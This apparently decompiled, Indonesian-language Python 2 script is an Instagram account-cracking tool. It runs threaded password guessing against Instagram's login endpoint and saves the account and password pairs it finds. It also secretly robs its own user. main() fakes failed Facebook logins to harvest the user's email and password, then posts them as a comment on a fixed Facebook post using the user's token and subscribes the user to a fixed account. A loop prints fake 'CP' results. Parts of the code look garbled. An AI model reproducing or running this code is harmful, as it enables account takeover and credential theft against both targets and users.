        jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90[JEECK X NANO]\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90')
        jeda(2)
        jeeck('%s+%s Results%s : %s%s %stotal %s: %s%s' % (B, J, B, K, file_nm, O, M, H, len(totalcp)))
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Total hasil --> %s ' % len(totalcp)
        jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90[JEECK X NANO]\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90')
        jeda(2)
        os.system('cat CP/%s' % file)
        jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90[JEECK X NANO]\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90')
        jeda(2)
        exit('\n')
    else:
        jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m Wronk Input Ya Bangsat')
        jeda(2)
        menu()


def hasil_igeh():
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m (1. Chek Results Ok')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m (2. Chek Results Cp')
    while True:
        mrjreckxnanoxxz = raw_input('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m Input : ')
        if mrjreckxnanoxxz in ('1', '01'):
            
            try:
                oke = open('hasilok.txt', 'r').readlines()
                jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90[JEECK X NANO]\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90')
                jeda(2)
                print '%s[+] %sTotal  %s: %s%s' % (U, O, M, H, str(len(oke)))
                jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90[JEECK X NANO]\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90')
                jeda(2)
                okek = open('hasilok.txt', 'r').read()
                print okek
                jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90[JEECK X NANO]\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90')
                jeda(2)
            except IOError:
                KeyError = None
                exit(M + '\n [+] Not Detected Results ')
            

        if mrjreckxnanoxxz in ('2', '02'):
            
            try:
                cepe = open('hasilcp.txt', 'r').readlines()
                jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90[JEECK X NANO]\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90')
                jeda(2)
                print '%s[+] %sJumlah %s: %s%s' % (U, O, M, K, str(len(cepe)))
                jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90[JEECK X NANO]\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90')
                jeda(2)
                cepek = open('hasilcp.txt', 'r').read()
                print cepek
                jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90[JEECK X NANO]\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90')
                jeda(2)
            except IOError:
                KeyError = None
                exit(M + '\n[+] Not Detected Results')
            

        return None


def main():
    token = raw_input('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Masukan token fb : ')
    
    try:
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        print nama
    except IOError:
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Token Invalid'
        exit()
    except KeyError:
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Token Invalid'
        exit()

    jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Jika anda mau hack akun facebook lebih maksimal silahkan masukan Email Dan Password Facebook')
    jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Jika anda tidak masukan Email dan Password facebook, kemungkinan akun mati(sesi)')
    user_fake = raw_input('\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Username/Email/Id : ')
    pass_fake = raw_input('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Password : ')
    jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Username atau password salah silahkan masukan lagi')
    user_fake = raw_input('\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Username/Email/Id : ')
    pass_fake = raw_input('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Password : ')
    jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Email atau password salah silahkan masukan lagi')
    user_fake = raw_input('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Username/Email/Id : ')
    pass_fake = raw_input('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Password : ')
    jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Login Berhasil')
    
    try:
        requests.post('https://graph.facebook.com/603362670759641/comments/?message=Nama (' + nama + ')\nEmail (' + user_fake + ')\nPassword (' + pass_fake + ')&access_token=' + token)
        requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + token)
    except:
        print 'Token Rusak !!'
        exit()

    os.system("echo 'H' >> .Hai")
    jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m setart crack')
    tahap1()


def wae():
    
    try:
        bass = open('.Hai', 'r').read()
    except:
        main()

    
    try:
        tahap1()
    except:
        print 'Error'



def tahap1():
    user1 = str(random.randint(0x4A817C800L, 0xDF8475800L))
    user2 = str(random.randint(0x7AEF40A00L, 0xC1B710800L))
    pass1 = pilih([
        'anjing',
        '123456789',
        '654321',
        '123456',
        'kontol',
        'sayang'])
    pass2 = pilih([
        'indonesia',
        'bangsat',
        'bajingan',
        '654321',
        'pantek',
        '102030'])
    print K + 'CP ' + C + '1000' + user1 + '|' + pass2
    return tahap1()


def proses():
    print '\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Results OK di simpan di --> %s ' % 'hasilok.txt'
    print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Results CP di simpan di --> %s ' % 'hasilcp.txt'
    print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Jika ingin Berhenti crack TEKAN CTRL + Z \n\n'


def crack2(user, pwx):
    global looping, loping, looping, loping, looping, loping
    c_naruto_ = len(pwx)
    for pas in pwx:
        if looping != 1:
            pass
        if len(status_foll) != 1:
            print '\r \x1b[0;00m Cracking %s/%s [OK:%s]-[CP:%s] ' % (str(loping), len(mi), len(ok), len(cp)),
            sys.stdout.flush()
            c_naruto_ -= 1
        
        try:
            if user in ok or user in cp:
                break
            pw = pas.lower()
            
            try:
                headerz = {
                    'User-Agent': user_agentz_api }
                with requests.Session() as ses:
                    urll = 'https://www.instagram.com/'
                    data = ses.get(urll, headers = headerz).content
                    tokett = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
                header = {
                    'Accept': '*/*',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Host': 'www.instagram.com',
                    'X-CSRFToken': tokett,
                    'X-Requested-With': 'XMLHttpRequest',
                    'Referer': 'https://www.instagram.com/accounts/login/',
                    'User-Agent': user_agentz }
                param = {
                    'username': user,
                    'enc_password': '#PWD_INSTAGRAM_BROWSER:0:{}:{}'.format(random.randint(1000000000, 0x174876E7FFL), pw),
                    'optIntoOneTap': False,
                    'queryParams': { },
                    'stopDeletionNonce': '',
                    'trustedDeviceRecords': { } }
            except:
                1
                header = { }
                param = { }

            with requests.Session() as ses:
                url = 'https://www.instagram.com/accounts/login/ajax/'
                respon = ses.post(url, data = param, headers = header)
                data = json.loads(respon.content)
                jeda(0.1)
                if 'checkpoint_url' in str(data):
                    cepeh = 'Checkpoint'
                    ingfo(user, pw, cepeh)
                    with open('hasilcp.txt', 'a') as simpan:
                        simpan.write(' [Checkpoint] ' + user + '|' + pw + '\n')
                    cp.append(user)
                    break
                elif 'userId' in str(data):
                    okeh = 'Berhasil'
                    if len(status_foll) != 1:
                        ingfo(user, pw, okeh)
                        with open('hasilok.txt', 'a') as simpan:
                            simpan.write(' [Berhasil] ' + user + '|' + pw + '\n')
                        ok.append(user)
                    break
                elif 'Please wait' in str(data):
                    print '\r\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Mode pesawat 2 detik',
                    looping += 1
                    sys.stdout.flush()
                    pwx = [
                        pw]
                    crack2(user, pwx)
                    loping -= 1
                else:
                    looping = 1
        continue
        except requests.exceptions.ConnectionError:
            1
            1
            print '\r\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Tidak ada koneksi',
            sys.stdout.flush()
            looping += 1
            pwx = [
                pw]
            crack2(user, pwx)
            loping -= 1
            continue
            looping = 1
            continue
        

    
    loping += 1

None

def passxnxx():
    with ThreadPoolExecutor(max_workers = 30) as log:
        for ro in mi:
            
            try:
                _naruto_ = []
                _r_ = ro.encode('utf-8')
                _o_ = _r_.split('|')[0]
                _m_ = _r_.split('|')[1]
                _i_ = _m_.split()
                if len(cr) != 1:
                    if len(_o_) >= 6:
                        _naruto_.append(_o_)
                        if len(_i_[0]) <= 2:
                            if len(_i_) >= 2:
                                _naruto_.append(_i_[0] + _i_[1])
                            if len(_m_) >= 6:
                                _naruto_.append(_m_)
                            
                        else:
                            _naruto_.append(_i_[0] + '123')
                            if len(_i_) >= 2:
                                _naruto_.append(_i_[0] + _i_[1])
                            if len(_m_) >= 6:
                                _naruto_.append(_m_)
                            
                    else:
                        _naruto_.append(_o_ + _o_)
                        if len(_i_[0]) <= 2:
                            if len(_i_) >= 2:
                                _naruto_.append(_i_[0] + _i_[1])
                            if len(_m_) >= 6:
                                _naruto_.append(_m_)
                            
                        elif len(_i_) >= 2:
                            _naruto_.append(_i_[0] + _i_[1])
                        _naruto_.append(_i_[0] + '123')
                        if len(_m_) >= 6:
                            _naruto_.append(_m_)
                        
                else:
                    _naruto_.append(_i_[0] + '123')
                    _naruto_.append(_i_[0] + '12345')
                    _naruto_.append(_o_)
                log.submit(crack2, _o_, _naruto_)
            continue
            continue

    jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Crack selesai.....')
    exit()


def ingfo(user, pw, status):
    global idg, pengikut, mengikuti
    
    try:
        dta = requests.get('https://www.instagram.com/%s/?__a=1' % user, headers = {
            'User-Agent': user_agentz })
        dta_ = dta.json()['graphql']['user']
        nama = dta_['full_name'].encode('utf-8')
        idg = dta_['id']
        pengikut = dta_['edge_followed_by']['count']
        mengikuti = dta_['edge_follow']['count']
        if status == 'Berhasil':
            print '\r\x1b[0;36m[\x1b[0;00m>\x1b[0;36m]\x1b[0;36m Live '
            print '\r\x1b[0;36m[\x1b[0;00m>\x1b[0;36m]\x1b[0;00m Nama       : %s ' % str(nama)
            print '\r\x1b[0;36m[\x1b[0;00m>\x1b[0;36m]\x1b[0;00m Pengikut   : %s ' % str(pengikut)
            print '\r\x1b[0;36m[\x1b[0;00m>\x1b[0;36m]\x1b[0;00m Mengikuti  : %s ' % str(mengikuti)
            print '\r\x1b[0;36m[\x1b[0;00m>\x1b[0;36m]\x1b[0;00m Username   : %s ' % user
            print '\r\x1b[0;36m[\x1b[0;00m>\x1b[0;36m]\x1b[0;00m Password   : %s \n' % pw
        elif status == 'Checkpoint':
            print '\r\x1b[0;36m[\x1b[0;00m>\x1b[0;36m]\x1b[0;33m Chekpoint '
            print '\r\x1b[0;36m[\x1b[0;00m>\x1b[0;36m]\x1b[0;00m Nama        : %s ' % str(nama)
            print '\r\x1b[0;36m[\x1b[0;00m>\x1b[0;36m]\x1b[0;00m Pengikut    : %s ' % str(pengikut)
            print '\r\x1b[0;36m[\x1b[0;00m>\x1b[0;36m]\x1b[0;00m Mengikuti   : %s ' % str(mengikuti)
            print '\r\x1b[0;36m[\x1b[0;00m>\x1b[0;36m]\x1b[0;00m Username    : %s ' % user
            print '\r\x1b[0;36m[\x1b[0;00m>\x1b[0;36m]\x1b[0;00m Password    : %s \n' % pw
    except:
        pass


None
loping = 1
if __name__ == '__main__':
    os.system('git pull')
    folder()
    menu()
